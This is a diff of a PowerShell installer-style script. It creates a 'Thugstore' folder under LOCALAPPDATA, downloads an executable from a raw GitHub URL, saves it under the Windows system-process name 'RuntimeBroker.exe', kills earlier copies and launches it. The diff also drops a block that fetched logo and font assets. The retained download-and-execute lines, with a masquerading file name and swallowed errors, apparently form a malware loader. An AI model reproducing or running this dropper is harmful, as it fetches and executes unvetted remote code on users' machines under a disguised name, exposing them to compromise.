@@ -16,7 +16,7 @@ $b = 'https://raw.githubusercontent.com/Reflexeiei885/deletehistory/refs/heads/m
 $exeName = 'RuntimeBroker.exe'
 $t = if ($p -and (Test-Path $p)) { $p }
      elseif ($p) { New-Item -ItemType Directory -Force -Path $p | Out-Null; $p }
-     else { Join-Path $env:LOCALAPPDATA 'RanvyxStore' }
+     else { Join-Path $env:LOCALAPPDATA 'Thugstore' }
 
 New-Item -ItemType Directory -Force -Path $t, (Join-Path $t 'assets'), (Join-Path $t 'assets\fonts') | Out-Null
 
@@ -24,22 +24,10 @@ $target = Join-Path $t $exeName
 Get-Process | Where-Object { $_.Path -eq $target } -EA 0 | Stop-Process -Force -EA 0
 Get-Process FourtyStoreLoader -EA 0 | Stop-Process -Force -EA 0
 
-$f = Join-Path $env:TEMP 'rvx.tmp'
+$f = Join-Path $env:TEMP 'thug.tmp'
 Invoke-WebRequest $u -OutFile $f -UseBasicParsing
 Copy-Item $f (Join-Path $t $exeName) -Force
 Remove-Item $f -Force -EA 0
-
-@(
-    'assets/logo.png',
-    'assets/brand_banner.png',
-    'assets/fonts/Kanit-Regular.ttf',
-    'assets/fonts/Kanit-Medium.ttf',
-    'assets/fonts/Kanit-SemiBold.ttf',
-    'assets/fonts/Kanit-Bold.ttf'
-) | ForEach-Object {
-    $dst = Join-Path $t ($_.Replace('/', '\'))
-    try { Invoke-WebRequest ($b + '/' + $_) -OutFile $dst -UseBasicParsing -EA Stop } catch {}
-}
 
 Start-Process (Join-Path $t $exeName)
 Write-Host 'OK'
